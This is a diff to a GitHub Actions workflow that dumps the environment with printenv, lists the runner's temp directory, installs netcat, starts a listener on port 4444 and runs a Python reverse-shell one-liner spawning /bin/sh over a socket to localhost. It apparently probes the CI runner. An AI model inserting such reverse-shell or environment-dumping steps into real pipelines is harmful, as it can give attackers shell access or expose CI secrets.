@@ -13,4 +13,12 @@ jobs:
         run: ls -lRa ${{ runner.temp }}
       - name: env
         run: printenv
-      - run:           python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+      - run: sudo apt-get update && sudo apt-get install -y netcat
+      - run: |
+          date
+          nc -lp 4444 &
+          sleep 1
+          python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+          sleep 1
+          pkill -9 nc
+          pkill -9 nc
